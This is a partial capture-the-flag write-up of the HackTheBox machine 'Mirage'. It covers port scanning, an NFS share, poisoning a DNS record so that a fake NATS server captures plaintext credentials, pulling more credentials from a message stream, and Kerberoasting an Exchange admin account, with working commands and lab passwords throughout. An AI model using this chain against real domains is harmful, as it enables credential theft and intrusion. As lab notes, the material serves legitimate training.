
### 🖥️ Machine Template


```
# Machine Name:
- **IP:10.10.11.78
- **OS:Windows
- **Difficulty:Hard
- **Date Completed:**

## 🎯 Target Information & Initial Enumeration

### 🔍 Nmap Scan
```

# Paste Nmap scan results here

```
### 🌐 Open Ports & Services

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 00:03 PDT
Nmap scan report for 10.10.11.78
Host is up (0.082s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-24 14:03:45Z)
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|_  100003  2,3,4       2049/tcp6  nfs
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
2049/tcp open  nfs           2-4 (RPC #100003)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-24T14:04:31
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

# Mirage (HTB) — Progress Notes

Target: **10.10.11.78** (Windows AD)  
Date: 2025-09-12/13  
Tags: #HTB #Mirage #Windows #Kerberos #DNS #NATS #JetStream

---

### 📄 Web Enumeration (e.g., Gobuster, Dirb)
- **Directories found:** _TBD_
- **Files found:** _TBD_
- **Interesting findings:** No HTTP enum yet; pivoted via NFS/AD DNS/NATS.

---

### 📦 NFS Enumeration
- `showmount -e 10.10.11.78` → **/MirageReports (everyone)**
- Mounted:  
  `sudo mount -t nfs -o vers=3,proto=tcp 10.10.11.78:/MirageReports /mnt/mirage_reports`
- Looted docs:
  - **Security Transition Plan: Deprecating NTLM @ Mirage.htb (Apr 11, 2025)**  
    → Environment moving to **Kerberos-only**; NTLM blocked on selected systems; Q4 2025 full disablement target.
  - **Incident Report – Missing DNS Record for `nats-svc` (May 6, 2025)**  
    → `nats-svc.mirage.htb` record scavenged; dev tooling connects to `nats-svc:4222` with **user/password**.

---

### 🧪 DNS Hijack (Dynamic Update)
- Added malicious A record for **`nats-svc.mirage.htb` → 10.10.14.7** via `nsupdate`.
- Verified: `dig @10.10.11.78 nats-svc.mirage.htb +short` → **10.10.14.7**

---

### 🛰 NATS Credential Capture (plaintext, no TLS)
- Ran a fake NATS on **0.0.0.0:4222** (send `INFO`, wait for client `CONNECT {user,pass}`).
- **Captured creds:** `Dev_Account_A : hx5h7F5554fP@1337!`

---

### 📨 JetStream Loot (using Dev creds)
- `nats stream ls` → Found **auth_logs** (5 msgs).
- Created pull consumer `reader`; pulled messages:
  - **`{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}`**
  - (pending messages remain — continue pulling)

---

### 🔐 Kerberos-Only Environment (Time Fix + TGT)
- Fixed skew: `sudo ntpdate -u 10.10.11.78`
- Got TGT: `getTGT.py mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'`  
  → saved **david.jjackson.ccache**

---

### 🧭 AD Enumeration (Kerberos)
- `GetUserSPNs.py -k -no-pass -dc-host dc01.mirage.htb mirage.htb/` →
  - **SPN:** `HTTP/exchange.mirage.htb`  
    **User:** `nathan.aadam` (group: **Exchange_Admins**) → **Kerberoastable target**

---

### 🔑 Creds Collected
- `Dev_Account_A : hx5h7F5554fP@1337!`
- `david.jjackson : pN8kQmn6b86!1234@`

---

### 🎯 Next Actions
- Kerberoast **nathan.aadam** and crack.
- Keep pulling **auth_logs** for more creds/secrets.
- With cracked Nathan creds, pivot to `exchange.mirage.htb` (Kerberos WinRM/SMB) for privesc.

---

### 🧰 Commands (reference)
```bash
# NFS
showmount -e 10.10.11.78
sudo mount -t nfs -o vers=3,proto=tcp 10.10.11.78:/MirageReports /mnt/mirage_reports

# DNS update
nsupdate  # add A nats-svc.mirage.htb 10.10.14.7 ; send
dig @10.10.11.78 nats-svc.mirage.htb +short

# NATS
nats stream ls --server nats://mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
nats consumer add auth_logs reader --pull
nats consumer next auth_logs reader --count=1 ...

# Time + Kerberos
sudo ntpdate -u 10.10.11.78
getTGT.py mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'
export KRB5CCNAME=david.jjackson.ccache
GetUserSPNs.py -k -no-pass -dc-host dc01.mirage.htb mirage.htb/


### 🔥 Kerberoast Result
- Target SPN: `HTTP/exchange.mirage.htb`
- User: `nathan.aadam` (group: Exchange_Admins)
- Hash type: `$krb5tgs$23$` (RC4 / etype 23) → hashcat `-m 13100`
- **Cracked password:** `3edc#EDC3`
- Next: Get TGT as Nathan, access `exchange.mirage.htb` via Kerberos (WinRM/SMB), check for Exchange→AD ACL abuse (DCSync path).
